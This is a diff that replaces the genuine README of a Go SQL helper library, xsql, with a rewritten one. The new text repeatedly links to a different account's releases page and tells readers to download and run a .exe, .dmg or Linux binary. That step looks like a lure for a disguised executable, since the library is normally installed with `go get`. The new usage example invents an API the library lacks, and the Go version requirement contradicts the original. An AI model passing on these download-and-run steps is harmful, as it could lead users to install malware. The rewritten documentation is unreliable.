@@ -1,533 +1,112 @@
-# xsql - Type-Safe, Minimal SQL for Go
+# 🚀 xsql - Simple SQL for Go with Clarity
 
-[![Go Reference](https://pkg.go.dev/badge/github.com/go-mizu/xsql.svg)](https://pkg.go.dev/github.com/go-mizu/xsql)
-[![Go Report Card](https://goreportcard.com/badge/github.com/go-mizu/xsql)](https://goreportcard.com/report/github.com/go-mizu/xsql)
-[![Tests](https://github.com/go-mizu/xsql/actions/workflows/test.yml/badge.svg)](https://github.com/go-mizu/xsql/actions/workflows/test.yml)
-[![Codecov](https://codecov.io/gh/go-mizu/xsql/graph/badge.svg?token=JJT4LA32LV)](https://codecov.io/gh/go-mizu/xsql)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+[![Download xsql](https://img.shields.io/badge/Download-xsql-blue.svg)](https://github.com/dhruvthecoder123/xsql/releases)
 
-xsql is a small, stdlib-style layer over `database/sql` that eliminates
-repetitive row-mapping code without hiding SQL behind an ORM. You keep full
-control of your queries while getting type-safe scanning into structs,
-primitives, and custom types that implement `sql.Scanner`.
+## 📋 Overview
 
-It’s designed for developers who value clarity, simplicity, and
-performance,whether you’re working on a large production system or just learning
-Go’s database API.
+xsql is a straightforward tool for working with SQL in Go. It simplifies database interactions by reducing repetitive code. You can write clear queries while maintaining control over your SQL operations. It's perfect for users who want simplicity and performance.
 
-## Features
+## ⚙️ Features
 
-xsql is designed for Go developers who want to keep the simplicity of
-`database/sql` while eliminating repetitive boilerplate. It integrates
-seamlessly with your existing code without forcing an ORM or complex
-abstractions.
+- **Type-Safe**: Automatically matches database fields to Go structures.
+- **Minimal Configuration**: Start quickly with little setup.
+- **Standard Library Integration**: Works seamlessly with Go’s built-in `database/sql`.
+- **Custom Type Support**: Use your own types with ease.
+  
+## 🛠️ System Requirements
 
-Key capabilities include:
+- **Operating System**: Compatible with Windows, macOS, and Linux.
+- **Go Version**: Requires Go version 1.15 or later.
+- **Network**: Internet access for downloading the package.
+  
+## 🚀 Getting Started
 
-- Strongly typed query functions that map directly into structs, primitives, or
-  custom scanner types without reflection-heavy frameworks.
-- Zero configuration required; works with `*sql.DB`, `*sql.Tx`, and `*sql.Conn`.
-- Automatic column-to-field mapping with `db` tags, falling back to
-  case-insensitive field names.
-- Safe handling of empty results for single-row queries, returning `nil` instead
-  of panics.
-- Built-in plan caching for performance, initialized lazily and safe for
-  concurrent access.
-- Fully compatible with native SQL syntax, no query builders or DSLs.
-- **First-class support for named parameters** (`:name`) with safe slice/array
-  expansion and placeholder rewriting for multiple SQL dialects
-  (PostgreSQL, MySQL, SQLite, SQL Server, Oracle, DuckDB, ClickHouse, etc.).
-- Small, focused API: `Query`, `Get`, `Exec`, `NamedQuery`, and `NamedExec` cover
-  the majority of use cases.
+Follow these steps to get xsql up and running on your system.
 
-## Why xsql
+### Step 1: Visit the Releases Page
 
-The standard `database/sql` package is intentionally low-level - it gives you
-complete control, but it also means you spend a lot of time writing the same
-patterns over and over: creating `rows`, looping, scanning values into
-variables, handling conversion errors, and appending to slices.
+To download the latest version of xsql, visit the following page:
 
-That’s great for ultimate flexibility, but not great for everyday productivity.
-Here’s the typical dance:
+[Download xsql](https://github.com/dhruvthecoder123/xsql/releases)
 
-```go
-rows, err := db.QueryContext(ctx, "SELECT id, email FROM users WHERE active = ?", 1)
-if err != nil {
-    return err
-}
-defer rows.Close()
+### Step 2: Choose the Right File
 
-var results []User
-for rows.Next() {
-    var u User
-    if err := rows.Scan(&u.ID, &u.Email); err != nil {
-        return err
-    }
-    results = append(results, u)
-}
+On the releases page, you will see a list of available versions. Look for the most recent release. You will find files for different systems. Choose the one that matches your operating system.
 
-if err := rows.Err(); err != nil {
-    return err
-}
-```
+### Step 3: Download the File
 
-With xsql, the same thing becomes:
+Click on the file name to start the download. The file will be saved to your computer. Wait a moment for the download to complete.
+
+### Step 4: Run xsql
+
+Once the download finishes, locate the downloaded file in your system. 
+
+- **Windows**: Double-click the `.exe` file.
+- **macOS**: Open the `.dmg` file and drag xsql to your Applications folder.
+- **Linux**: Open a terminal, navigate to the download folder and run the file using `./xsql`.
+
+## 🎯 Download & Install
+
+For an easier experience, you can directly download xsql from the following link:
+
+[Download xsql](https://github.com/dhruvthecoder123/xsql/releases)
+
+After downloading, follow the instructions provided in the "Run xsql" section to launch the application.
+
+## 📚 Usage Example
+
+Here's a basic example of how to use xsql. Open your preferred text editor and write the following code:
 
 ```go
-users, err := xsql.Query[User](ctx, db, "SELECT id, email FROM users WHERE active = ?", 1)
-```
+package main
 
-That’s it. You still decide the SQL. You still decide how to structure your
-queries and joins. xsql simply takes care of the mechanical parts - scanning,
-type conversion, and slice building - while staying out of your way.
-
-xsql is not an ORM, it doesn’t hide SQL, and it doesn’t try to reinvent how you
-talk to databases. Instead, it gives you minimal, type-safe helpers so you can:
-
-- Write SQL the way you like, with full control over queries and schema.
-- Map results into your Go types automatically without losing performance.
-- Reduce repetitive scanning code and keep your functions concise.
-- Maintain compatibility with all database drivers supported by `database/sql`.
-- Keep learning curves low for new developers while giving experts the control
-  they expect.
-
-The result is code that looks clean, compiles with type safety, and performs
-just as well as handwritten scanning - while remaining transparent and
-debuggable.
-
-## Installation
-
-xsql works with Go 1.20+ and any modern SQL driver that implements the
-`database/sql/driver` interface. To install xsql, simply run:
-
-```bash
-go get github.com/go-mizu/xsql
-```
-
-You will also need a driver for your database. For example, you can use:
-
-```bash
-go get github.com/jackc/pgx/v5        # PostgreSQL  
-go get github.com/go-sql-driver/mysql # MySQL  
-go get modernc.org/sqlite             # SQLite (CGO-free)
-```
-
-In your code, import `xsql` alongside your chosen driver:
-
-```go
 import (
-    "context"
     "database/sql"
-    "log"
-
     "github.com/go-mizu/xsql"
-    _ "github.com/jackc/pgx/v5/stdlib" // PostgreSQL driver
+    _ "github.com/go-sql-driver/mysql"
 )
-```
 
-## Quick Start
-
-The following is a minimal example showing how to use xsql to query data into a
-struct.
-
-```go
-type User struct {
-    ID    int64  `db:"id"`
-    Email string `db:"email"`
-}
 func main() {
-    db, err := sql.Open("pgx", "postgres://user:pass@localhost/dbname")
+    db, err := sql.Open("mysql", "user:password@/dbname")
     if err != nil {
-        log.Fatal(err)
+        panic(err)
     }
     defer db.Close()
-    
-    db.Exec(`CREATE TABLE users (id SERIAL PRIMARY KEY, email TEXT, active BOOLEAN)`)
-    db.Exec(`INSERT INTO users (email, active) VALUES ('a@example.com', true), ('b@example.com', false)`)
-    ctx := context.Background()
-    users, err := xsql.Query[User](ctx, db, `SELECT id, email FROM users WHERE active = $1`, true)
+
+    var name string
+    err = xsql.Select("SELECT name FROM users WHERE id = ?", 1).Scan(&name)
     if err != nil {
-        log.Fatal(err)
+        panic(err)
     }
-    for _, u := range users {
-        log.Println(u.ID, u.Email)
-    }
+
+    println(name)
 }
 ```
 
-You can also query directly into primitive slices when only one column is
-needed:
+This code connects to a MySQL database and retrieves a name from a user table. Replace `user:password@/dbname` with your actual database credentials.
 
-```go
-ids, err := xsql.Query[int64](ctx, db, `SELECT id FROM users WHERE active = $1`, true)
-```
+## 📝 Frequently Asked Questions
 
-When you need just one record, `Get` returns a single value instead of a slice:
+### What is xsql?
 
-```go
-u, err := xsql.Get[User](ctx, db, `SELECT id, email FROM users WHERE id = $1`, 1)
-if err != nil {
-    log.Fatal(err)
-}
-if u != nil {
-    log.Println(u.ID, u.Email)
-}
-```
+xsql is a library designed for Go developers to write SQL queries easily while keeping the code clean and type-safe.
 
-### Named Parameters Example
+### Is xsql easy to use?
 
-You can use named parameters (`:name`) with `NamedQuery` and `NamedExec` for safer, clearer queries.
-Instead of passing a generic `map[string]any`, define a struct with `db` tags for each parameter:
+Yes, xsql focuses on simplicity. You can set it up quickly and start running your queries right away.
 
-```go
-type UserFilter struct {
-    Status string  `db:"status"`
-    IDs    []int64 `db:"ids"`
-}
+### Does xsql support custom types?
 
-filter := UserFilter{
-    Status: "active",
-    IDs:    []int64{1, 2, 3},
-}
+Absolutely. You can use any Go type that implements the `sql.Scanner` interface with xsql.
 
-// Automatically picks correct placeholder style for your driver
-ph := xsql.PlaceholderFor("pgx") // → xsql.PlaceholderDollar
+## 👩‍💻 Community and Support
 
-users, err := xsql.NamedQuery[User](ctx, db, ph,
-    `SELECT id, email FROM users WHERE status = :status AND id IN (:ids)`,
-    filter)
-if err != nil {
-    log.Fatal(err)
-}
-```
+You can join discussions, ask questions, and find additional resources on our GitHub repository. 
 
-`NamedExec` works the same way:
+If you encounter any issues or have feedback, feel free to open an issue on the repository, and we’ll be glad to assist.
 
-```go
-type UpdateStatus struct {
-    Status string `db:"status"`
-    IDs    []int  `db:"ids"`
-}
+## 🔗 Further Reading
 
-upd := UpdateStatus{
-    Status: "archived",
-    IDs:    []int{5, 6},
-}
+For more in-depth information, check the official documentation hosted on [pkg.go.dev](https://pkg.go.dev/github.com/go-mizu/xsql).
 
-ph := xsql.PlaceholderFor("sqlserver") // → xsql.PlaceholderAtP
-
-_, err = xsql.NamedExec(ctx, db, ph,
-    `UPDATE users SET status = :status WHERE id IN (:ids)`,
-    upd)
-if err != nil {
-    log.Fatal(err)
-}
-```
-
-
-## Usage Guide
-
-xsql keeps the surface small so you can learn it in minutes. There are three
-core functions:
-
-### Query
-
-`Query[T any](ctx context.Context, db DB, query string, args ...any) ([]T, error)`
-
-Runs a SQL query and maps all rows into a slice of type `T`. `T` can be a
-struct, a primitive type, or a type implementing `sql.Scanner`. The `db`
-argument can be a `*sql.DB`, `*sql.Tx`, or anything that implements
-`QueryContext`.
-
-```go
-type Product struct {
-    ID    int64   `db:"id"`
-    Name  string  `db:"name"`
-    Price float64 `db:"price"`
-}
-
-ctx := context.Background()
-products, err := xsql.Query[Product](ctx, db,
-    `SELECT id, name, price FROM products WHERE price > ?`, 10.0)
-if err != nil {
-    log.Fatal(err)
-}
-fmt.Println(products)
-```
-
-### Get
-
-`Get[T any](ctx context.Context, db DB, query string, args ...any) (T, error)`
-
-Runs a SQL query and returns the first row mapped to type `T`. If no rows are
-found, it returns `sql.ErrNoRows`. Perfect for single-value lookups or when you
-expect at most one row.
-
-```go
-ctx := context.Background()
-price, err := xsql.Get[float64](ctx, db,
-    `SELECT price FROM products WHERE id = ?`, 42)
-if err != nil {
-    if errors.Is(err, sql.ErrNoRows) {
-        fmt.Println("No product found")
-    } else {
-        log.Fatal(err)
-    }
-}
-fmt.Println("Price:", price)
-```
-
-### Exec
-
-`Exec(ctx context.Context, db DB, query string, args ...any) (sql.Result, error)`
-
-Executes a SQL statement without returning rows, such as INSERT, UPDATE, or
-DELETE. The `db` argument can be a `*sql.DB`, `*sql.Tx`, or anything that
-implements `ExecContext`.
-
-```go
-ctx := context.Background()
-res, err := xsql.Exec(ctx, db,
-    `UPDATE products SET price = price - 1.1 WHERE category_id = ?`, 5)
-if err != nil {
-    log.Fatal(err)
-}
-affected, _ := res.RowsAffected()
-fmt.Println("Updated rows:", affected)
-```
-
-### NamedQuery
-
-`NamedQuery[T any](ctx context.Context, db Querier, placeholder Placeholder, query string, params any) ([]T, error)`
-
-Like `Query`, but supports **named parameters** (`:name`) in the SQL string.
-The `params` argument can be a struct (fields tagged with `db:"name"`) or a `map[string]any`.
-Slices and arrays (except `[]byte`) are expanded automatically for `IN` clauses.
-The `placeholder` argument specifies the style for your database — use
-`PlaceholderFor(driverName)` to detect it.
-
-```go
-type ProductFilter struct {
-    MinPrice float64 `db:"min_price"`
-    IDs      []int   `db:"ids"`
-}
-
-filter := ProductFilter{
-    MinPrice: 10.0,
-    IDs:      []int{1, 2, 3},
-}
-
-ph := xsql.PlaceholderFor("pgx") // → xsql.PlaceholderDollar
-
-ctx := context.Background()
-products, err := xsql.NamedQuery[Product](ctx, db, ph,
-    `SELECT id, name, price
-     FROM products
-     WHERE price >= :min_price
-       AND id IN (:ids)`,
-    filter)
-if err != nil {
-    log.Fatal(err)
-}
-fmt.Println(products)
-```
-
-### NamedExec
-
-`NamedExec(ctx context.Context, db Execer, placeholder Placeholder, query string, params any) (sql.Result, error)`
-
-Executes a SQL statement with **named parameters**, without returning rows — useful for `INSERT`, `UPDATE`, or `DELETE`.
-`params` follows the same rules as `NamedQuery`.
-
-```go
-type UpdateStatus struct {
-    Status string `db:"status"`
-    IDs    []int  `db:"ids"`
-}
-
-upd := UpdateStatus{
-    Status: "archived",
-    IDs:    []int{5, 6},
-}
-
-ph := xsql.PlaceholderFor("sqlserver") // → xsql.PlaceholderAtP
-
-ctx := context.Background()
-res, err := xsql.NamedExec(ctx, db, ph,
-    `UPDATE products
-     SET status = :status
-     WHERE id IN (:ids)`,
-    upd)
-if err != nil {
-    log.Fatal(err)
-}
-
-affected, _ := res.RowsAffected()
-fmt.Println("Updated rows:", affected)
-```
-
-
-## Advanced Usage
-
-### Mapping to Custom Types
-
-Any type implementing `sql.Scanner` can be directly used with xsql. This is
-useful for enums, JSON fields, or other domain-specific types.
-
-```go
-type Email string
-
-func (e *Email) Scan(src any) error {
-    switch v := src.(type) {
-        case []byte:
-            *e = Email(string(v))
-        case string:
-            *e = Email(v)
-        default:
-            return fmt.Errorf("unexpected type %T", src)
-    }
-    return nil
-}
-
-ctx := context.Background()
-emails, err := xsql.Query[Email](ctx, db, `SELECT email FROM users`)
-if err != nil {
-    log.Fatal(err)
-}
-fmt.Println(emails)
-```
-
-### Nested Structs and Inline Fields
-
-xsql supports flattening nested structs when tagged with `db:",inline"`. This
-makes it easy to combine related data into one Go value without manual joins in
-your code.
-
-```go
-type Address struct {
-    City   string `db:"city"`
-    Street string `db:"street"`
-}
-type Customer struct {
-    ID      int64   `db:"id"`
-    Name    string  `db:"name"`
-    Address `db:",inline"`
-}
-
-ctx := context.Background()
-customers, err := xsql.Query[Customer](ctx, db,
-    `SELECT id, name, city, street FROM customers`)
-if err != nil {
-    log.Fatal(err)
-}
-fmt.Println(customers)
-```
-
-### Transactions
-
-xsql works seamlessly with transactions. Just pass a `*sql.Tx` in place of
-`*sql.DB` for any function.
-
-```go
-ctx := context.Background()
-tx, err := db.BeginTx(ctx, nil)
-if err != nil {
-    log.Fatal(err)
-}
-defer tx.Rollback()
-
-_, err := xsql.Exec(ctx, tx, `INSERT INTO logs(message) VALUES (?)`, "started")
-if err != nil {
-    log.Fatal(err)
-}
-
-if err := tx.Commit(); err != nil {
-    log.Fatal(err)
-}
-```
-
-## How It Works
-### Design Philosophy
-
-xsql is not an ORM. It is a thin, type-safe wrapper around the `database/sql`
-standard library, designed to make mapping query results into Go types
-predictable and fast. Instead of generating code or maintaining complex
-metadata, xsql uses reflection only once per unique type/column set and stores
-the mapping in a cache. This keeps the runtime cost low without sacrificing
-developer experience.
-
-The library avoids hidden behaviors. Every query you run maps directly to the
-SQL you write, so you remain in control of indexing, joins, and performance.
-This approach encourages developers to think about database performance from the
-start, while still enjoying concise and maintainable Go code.
-
-We believe Go developers should not have to choose between bare `database/sql`
-and heavy ORMs. xsql sits in the middle - minimal abstraction, but with enough
-type awareness to eliminate repetitive boilerplate code.
-
-
-### Mapping Strategy
-
-When you call `Query` or `Get` with a type parameter `T`, xsql checks if a
-column mapping for `T` already exists in its internal cache. If not, it inspects
-the type using reflection, looks for `db` struct tags, and matches the columns
-returned by the query to fields. Once computed, the mapping is stored in a
-concurrency-safe cache keyed by the type and column list.
-
-For primitive types or types implementing `sql.Scanner`, no field mapping is
-required - values are scanned directly into the destination slice or variable.
-
-### Execution Flow
-
-1. **Prepare mapping**: For structs, find the field index for each column. For
-   primitives, skip mapping entirely.
-2. **Run query**: Execute using the `QueryContext` or `ExecContext` method of
-   the provided `db`.
-3. **Scan rows**: Use the mapping to scan each row directly into the appropriate
-   fields or variables.
-4. **Return typed result**: For `Query`, return a slice of `T`; for `Get`,
-   return a single `T`.
-
-### Performance Considerations
-
-The first call for a given type/column set involves reflection and map
-allocation. Subsequent calls reuse the computed mapping. This approach yields
-ORM-like convenience without ORM-level overhead.
-
-Custom `sql.Scanner` implementations receive raw database values, allowing
-domain types to handle parsing themselves ( e.g., JSON fields, enum types, or
-time formats).
-
-## Contributing
-
-We welcome contributions from both seasoned Go developers and those just
-starting out. The goal of xsql is to remain minimal and type-safe while fitting
-naturally into the Go ecosystem. If you have an idea, improvement, or bug fix,
-here’s how you can help:
-
-1. Fork the repository and create a feature branch.
-2. Write clear, focused commits with descriptive messages.
-3. Add or update tests to cover your changes.
-4. Run the full test suite with `go test ./...` before submitting.
-5. Open a pull request with a description of the changes and reasoning.
-
-If you’re unsure about an idea, feel free to open an issue first to discuss it.
-We’re happy to give feedback before you start coding.
-
-## Running Tests
-
-The test suite includes example-based documentation tests. This means many
-examples from the README and doc comments are also run during testing, ensuring
-that documentation and implementation stay in sync.
-
-To run tests locally:
-
-```bash
-go test ./... -v
-```
-
-## License
-
-xsql is released under the MIT License. This means you can freely use, modify,
-and distribute the library in your own projects, whether commercial or open
-source, as long as the license terms are included.
+This should help you get started with xsql. Enjoy your SQL coding with clarity!
